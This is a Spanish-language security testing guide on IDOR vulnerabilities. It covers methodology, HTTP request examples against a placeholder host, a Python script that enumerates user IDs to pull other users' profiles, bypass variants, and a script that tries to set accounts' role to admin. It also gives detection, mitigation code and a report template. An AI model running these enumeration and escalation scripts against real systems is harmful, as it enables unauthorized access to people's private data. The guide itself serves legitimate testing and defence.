# Referencias Inseguras Directas a Objetos (IDOR)

## Resumen

Una vulnerabilidad IDOR permite a un atacante manipular identificadores para acceder a recursos sin autorización adecuada. La aplicación confía en identificadores del usuario sin verificar permisos del lado del servidor, permitiendo acceso horizontal (mismo nivel) o vertical (escalada de privilegios). Aplica cuando las aplicaciones usan referencias directas a objetos mediante parámetros controlables por el usuario.[^3]

## Contexto

Las pruebas requieren navegador con herramientas de desarrollo, proxy de intercepción como Burp Suite, múltiples cuentas de usuario y acceso al entorno de testing. Las versiones modernas incluyen APIs REST/GraphQL con identificadores UUID/numéricos. Los falsos positivos surgen cuando los objetos son públicos por diseño o cuando se confunde autorización legítima con vulnerabilidad.[^6]

## Metodología

### Identificación de Referencias a Objetos

1. **Mapear endpoints que referencien objetos**
   - URLs con parámetros: `/user/123`, `/order?id=456`
   - Cuerpo de peticiones POST/PUT con IDs
   - Cabeceras personalizadas con identificadores
   - Cookies con referencias de objetos
2. **Catalogar tipos de identificadores**
   - Numéricos secuenciales (1, 2, 3...)
   - UUIDs/GUIDs aparentemente aleatorios
   - Identificadores codificados (Base64, hash)
   - Referencias de archivos estáticos[^1]
3. **Verificación de control de acceso**
   - Crear Usuario A y Usuario B con datos diferenciables
   - Realizar acción legítima con Usuario A
   - Interceptar petición y cambiar ID por el de Usuario B
   - Evaluar si Usuario A accede a datos de Usuario B

### Checklist de Verificación

- [ ]  Probar todos los métodos HTTP (GET, POST, PUT, DELETE)
- [ ]  Verificar referencias en URL, cuerpo, cabeceras y cookies
- [ ]  Testear escalada horizontal y vertical
- [ ]  Buscar IDs expuestos en respuestas o código fuente
- [ ]  Probar identificadores ofuscados y decodificarlos
- [ ]  Evaluar GraphQL con argumentos manipulables[^4]

## Pruebas Manuales

### Configuración Inicial

Usar Burp Suite configurando dos usuarios diferentes. Interceptar tráfico y identificar patrones de identificadores en peticiones.

### Casos de Prueba Específicos

**Caso 1: API REST con ID numérico**

```http
GET /api/user/167865/profile HTTP/1.1
Host: victima.com
Authorization: Bearer token_usuario_A
```

Cambiar ID a otro usuario:

```http
GET /api/user/167866/profile HTTP/1.1
Host: victima.com  
Authorization: Bearer token_usuario_A
```

**Caso 2: GraphQL con argumentos**[^4]

```graphql
query {
  blogPost(id: "123") {
    title
    author
    content
  }
}
```

**Caso 3: Archivos estáticos**[^1]

```http
GET /static/document_12345.pdf HTTP/1.1
Host: victima.com
```

### Evidencias Mínimas

- Screenshots de respuestas mostrando datos de diferentes usuarios
- Logs de peticiones con IDs modificados
- Diferencias en Content-Length indicando acceso exitoso
- Datos específicos que confirmen acceso no autorizado

## PoC

### Manual: Acceso a Perfil de Usuario

**Objetivo:** Demostrar acceso no autorizado a perfil de otro usuario

**Pasos:**

1. Autenticarse como usuario normal en victima.com
2. Navegar a perfil propio: `GET /api/user/1001/profile`
3. Interceptar con Burp Suite
4. Cambiar ID a `1002` (usuario administrador)
5. Enviar petición modificada
6. Observar acceso exitoso a datos administrativos

**Resultado Esperado:** Acceso a información de administrador sin permisos

### Automatizada: Script de Enumeración

```python
import requests
import json

def test_idor_enumeration(base_url, auth_token, start_id=1, end_id=100):
    """
    Script automatizado para detección de IDOR
    """
    headers = {
        'Authorization': f'Bearer {auth_token}',
        'Content-Type': 'application/json'
    }
  
    vulnerable_ids = []
  
    for user_id in range(start_id, end_id + 1):
        url = f"{base_url}/api/user/{user_id}/profile"
  
        try:
            response = requests.get(url, headers=headers, timeout=10)
    
            if response.status_code == 200:
                data = response.json()
                # Verificar si contiene datos de otro usuario
                if 'username' in data and data['username'] != 'current_user':
                    vulnerable_ids.append(user_id)
                    print(f"[+] IDOR encontrado: ID {user_id} - Usuario: {data.get('username')}")
            
        except requests.RequestException as e:
            print(f"[-] Error al probar ID {user_id}: {e}")
  
    return vulnerable_ids

# Uso del script
vulnerable = test_idor_enumeration('https://victima.com', 'token_atacante', 1, 50)
```

## Explotación/Automatización

### Variantes de Bypass

**Contaminación de Parámetros**[^7]

```http
POST /api/update_profile HTTP/1.1
user_id=1001&user_id=1002&email=atacante@email.com
```

**Manipulación JSON**[^7]

```json
{
  "user_id": [1001, 1002],
  "email": "atacante@email.com"
}
```

**Palabras Clave Estáticas**[^7]

```http
GET /api/user/current/profile HTTP/1.1
# Cambiar a:
GET /api/user/1002/profile HTTP/1.1
```

### Condiciones de Carrera

Para endpoints de actualización simultánea:

```python
import threading
import requests

def race_condition_idor():
    url1 = "https://victima.com/api/user/1001/update"
    url2 = "https://victima.com/api/user/1002/update"
  
    def request1():
        requests.put(url1, json={"role": "admin"})
  
    def request2():
        requests.put(url2, json={"role": "admin"})
  
    t1 = threading.Thread(target=request1)
    t2 = threading.Thread(target=request2)
  
    t1.start()
    t2.start()
```

### Snippet de Intruder para Burp Suite

Configurar Intruder con payload numérico secuencial (1-10000), analizar respuestas por código de estado y longitud de contenido.[^8]

## Impacto

### Escenario Real

Un atacante accede a datos financieros de 10,000 usuarios mediante enumeración de IDs secuenciales, obteniendo números de cuenta, transacciones e información personal identificable.[^9]

### Mapeo de Seguridad

- **OWASP:** A01:2021 - Broken Access Control
- **CWE:** CWE-639 - Insecure Direct Object Reference[^11]
- **CVSS v3.1:** Rango típico 6.0-8.0 (Medio-Alto)[^13]

### Severidad CVSS

Para IDOR con lectura de datos sensibles:[^12]

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
Puntuación Base: 6.5
```

Para modificación de datos:[^13]

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N  
Puntuación Base: 8.1
```

## Detección

### Logs de Aplicación

Implementar logging de:

- Accesos a recursos con ID de usuario diferente al autenticado
- Patrones de enumeración secuencial de IDs
- Intentos de acceso a recursos inexistentes
- Cambios de parámetros de autorización

### WAF/CDN[^14]

Configurar reglas para detectar:

- Patrones de enumeración rápida de IDs
- Requests con IDs fuera del rango del usuario
- Anomalías en frecuencia de acceso a recursos

### EDR/SIEM

Correlacionar eventos de:

- Múltiples accesos 200 OK con IDs diferentes
- Picos de tráfico a endpoints sensibles
- Respuestas con tamaños anómalos

## Mitigación

### Fix Principal

Implementar verificación de autorización obligatoria:

```javascript
// Ejemplo de verificación correcta
async function getUserProfile(userId, requestingUserId) {
  // Verificar que el usuario puede acceder al perfil
  if (userId !== requestingUserId && !isAdmin(requestingUserId)) {
    throw new Error('Acceso no autorizado');
  }
  
  return database.getUser(userId);
}
```

### Controles Adicionales

1. **Usar referencias indirectas**
   - Mapear IDs públicos a internos por sesión de usuario
   - Implementar tokens de acceso por recurso
2. **Validación del lado del servidor**[^2]
   - Verificar ownership de objetos en cada request
   - Implementar ACLs (Access Control Lists)
3. **Principio de menor privilegio**
   - Limitar acceso a datos mínimos necesarios
   - Implementar RBAC/ABAC[^4]

### Pruebas Post-Fix

- Verificar que usuarios solo acceden a sus recursos
- Confirmar que administradores tienen acceso apropiado
- Testear edge cases con IDs malformados
- Validar logs de acceso funcionando correctamente

## Errores Comunes

### Falsos Positivos

- Confundir recursos públicos con vulnerabilidades IDOR
- No considerar roles legítimos de administrador
- Asumir vulnerabilidad en UUIDs sin probar obtención de IDs
- Reportar funcionalidad normal como IDOR[^6]

### Límites de Testing

- IDs realmente impredecibles sin fugas de información
- Sistemas con autorización compleja por roles
- APIs que requieren múltiples parámetros de validación
- Rate limiting que impide enumeración efectiva

## Reporte

### Título

"Referencias Inseguras Directas a Objetos (IDOR) - Acceso No Autorizado a Datos de Usuario"

### Resumen Ejecutivo

La aplicación permite acceso no autorizado a recursos de otros usuarios mediante manipulación de identificadores, afectando confidencialidad e integridad de datos sensibles.

### Pasos de Reproducción

1. Registrar dos cuentas de usuario (User A, User B)
2. Autenticarse como User A
3. Interceptar request a recurso propio: `GET /api/user/123/data`
4. Modificar ID a User B: `GET /api/user/124/data`
5. Observar acceso exitoso a datos de User B

### Evidencias

- Screenshots de respuestas con datos de diferentes usuarios
- Logs de Burp Suite mostrando requests modificados
- Comparativa de datos accedidos vs. datos autorizados

### Mitigación Recomendada

Implementar verificación de autorización del lado del servidor para todos los accesos a recursos, validando que el usuario autenticado tiene permisos para el objeto específico solicitado.


[^1]: https://portswigger.net/web-security/access-control/idor
    
[^2]: https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
    
[^3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
    
[^4]: https://escape.tech/blog/idor-in-graphql/
    
[^5]: https://portswigger.net/web-security/graphql
    
[^6]: https://redmethod.hashnode.dev/idor-broken-authentication
    
[^7]: https://www.intigriti.com/blog/news/idor-a-complete-guide-to-exploiting-advanced-idor-vulnerabilities
    
[^8]: https://spyboy.blog/2024/09/19/idor-vulnerabilities-finding-exploiting-and-securing/
    
[^9]: https://www.webasha.com/blog/what-is-an-example-of-a-real-bug-bounty-report-where-idor-was-used-to-exploit-a-banking-application
    
[^10]: https://www.veracode.com/security/java/cwe-639/
    
[^11]: https://www.clouddefense.ai/cwe/definitions/639
    
[^12]: https://cqr.company/web-vulnerabilities/idor-vulnerability/
    
[^13]: https://www.aptori.com/blog/a-guide-to-identifying-idor-vulnerabilities
    
[^14]: https://gbhackers.com/building-a-threat-detection-pipeline-using-waf-logs-and-external-intel-feeds/
    
[^15]: https://the-red.team/post/templates/idor/
    
[^16]: https://www.nodejs-security.com/blog/how-to-hunt-for-idor-vulnerabilities-to-exploit-security-misconfiguration
    
[^17]: https://infosecwriteups.com/️-hunting-idor-a-deep-dive-into-insecure-direct-object-references-b550a9f77333
    
[^18]: https://limpiatuweb.com/blog/referencias-de-objetos-directos-inseguras-idor/
    
[^19]: https://www.legitsecurity.com/aspm-knowledge-base/insecure-direct-object-references/
    
[^20]: https://bigid.com/blog/idor-vulnerability/
    
[^21]: https://book.h4ck.cl/vulnerabilidades-web/idor-insecure-direct-object-reference
    
[^22]: https://www.wiz.io/vulnerability-database/cve/cve-2025-3281
    
[^23]: https://portswigger.net/burp/documentation/desktop/testing-workflow/access-controls/testing-for-idors
    
[^24]: https://virtualcyberlabs.com/insecure-direct-object-references-idor/
    
[^25]: https://www.youtube.com/watch?v=jvDFiIyNW_o
    
[^26]: https://authenticone.com/idor-the-silent-gateway-to-data-breaches/
    
[^27]: https://www.invicti.com/learn/insecure-direct-object-references-idor/
    
[^28]: https://www.vaadata.com/blog/what-are-idor-insecure-direct-object-references-attacks-exploits-security-best-practices/
    
[^29]: https://lab.wallarm.com/what/vulnerabilidad-idor-referencias-directas-a-objetos-inseguras/?lang=es
    
[^30]: https://osintteam.blog/understanding-cvss-scoring-with-a-real-world-idor-example-in-e-commerce-fbb885db932f
    
[^31]: https://www.first.org/cvss/calculator/3-1
    
[^32]: https://docs.hackerone.com/en/articles/8369826-detailed-platform-standards
    
[^33]: https://spyboy.blog/2025/04/24/the-ultimate-guide-to-finding-idor-vulnerabilities-guaranteed-approach-top-payloads-tools/
    
[^34]: https://infosecwriteups.com/how-to-choose-the-correct-severity-or-cvss-score-for-a-bug-a-practical-guide-7a83be0096f3
    
[^35]: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html
    
[^36]: https://techcommunity.microsoft.com/blog/azurenetworksecurityblog/comprehensive-guide-to-monitoring-azure-waf-metrics-and-logs/4378260
    
[^37]: https://patchstack.com/database/wordpress/plugin/thumbs-rating/vulnerability/wordpress-thumbs-rating-plugin-5-1-0-insecure-direct-object-references-idor-vulnerability
    
[^38]: https://docs.guardrails.io/docs/vulnerability-classes/insecure-access-control/idor
    
[^39]: https://infosecwriteups.com/automate-xss-idor-bug-hunting-using-bash-python-a-hackers-toolkit-e8453e51f703
    
[^40]: https://hackerone.com/reports/2207248
    
[^41]: https://www.vaadata.com/blog/exploiting-a-broken-access-control-vulnerability-on-graphql/
    
[^42]: https://www.verylazytech.com/idor
    
[^43]: https://security.tecno.com/SRC/blogdetail/304?lang=en_US
    
[^44]: https://github.com/AyemunHossain/IDORD
    
[^45]: https://osintteam.blog/25000-idor-how-a-simple-id-enumeration-exposed-private-data-7de2f60c46fd
    
[^46]: https://github.com/S12cybersecurity/Idor-Hunter
    
[^47]: https://academy.hackthebox.com/course/preview/attacking-graphql
    
[^48]: https://help.aikido.dev/dast-surface-monitoring/api-scanning/understanding-and-detecting-idor-vulnerabilities
    
[^49]: https://snyk.io/blog/insecure-direct-object-references-python/
    
[^50]: https://sayfer.io/es/blog/idor-insecure-direct-object-reference/
    
[^51]: https://wiki.curiosidadesdehackers.com/insecure-direct-object-reference-idors-prueba-de-concepto-y-explicacion/
    
[^52]: https://notes.theoffsecgirl.com/01-fundamentos-esenciales/01g-uso-de-etc-hosts
    
[^53]: https://hetmehta.com/posts/Bypassing-Modern-WAF/
    
[^54]: https://www.skipso.com/responsible-disclosure
    
[^55]: https://www.nodejs-security.com/blog/idor-vulnerability-what-is-it-and-how-to-prevent-it
    
[^56]: https://osintteam.blog/cracking-the-shield-advanced-waf-bypass-techniques-that-still-work-in-2025-814cee616ccf
    
[^57]: https://www.aon.com/en/insights/cyber-labs/finding-more-idors-tips-and-tricks
    
[^58]: https://www.imperva.com/learn/application-security/insecure-direct-object-reference-idor/
    
[^59]: https://infosecwriteups.com/idor-attacks-made-simple-how-hackers-access-unauthorized-data-ca1158d18190
    
[^60]: https://hadrian.io/blog/insecure-direct-object-reference-idor-a-deep-dive
    
[^61]: https://bugbase.ai/blog/top-10-ways-to-bypass-waf
